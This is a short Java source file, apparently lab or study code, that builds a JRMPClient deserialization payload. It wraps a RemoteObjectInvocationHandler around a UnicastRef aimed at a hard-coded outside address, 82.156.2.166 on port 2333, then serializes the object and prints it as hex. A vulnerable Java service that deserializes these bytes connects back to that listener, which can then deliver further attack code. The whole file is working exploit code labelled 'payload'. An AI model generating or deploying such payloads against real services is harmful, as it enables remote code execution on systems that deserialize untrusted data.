package JRMPTest;

import com.sun.corba.se.spi.ior.ObjectId;
import lab1.Utils;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

// payload
public class JRMPClient {
    public static void main(String[] args) throws Exception{
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint tcp = new TCPEndpoint("82.156.2.166", 2333);
        UnicastRef ref = new UnicastRef(new LiveRef(id, tcp, false));
        RemoteObjectInvocationHandler roi = new RemoteObjectInvocationHandler(ref);
//        Registry registry = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[]{Registry.class}, roi);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(roi);
        System.out.println(Utils.bytesTohexString(bos.toByteArray()));
    }
}
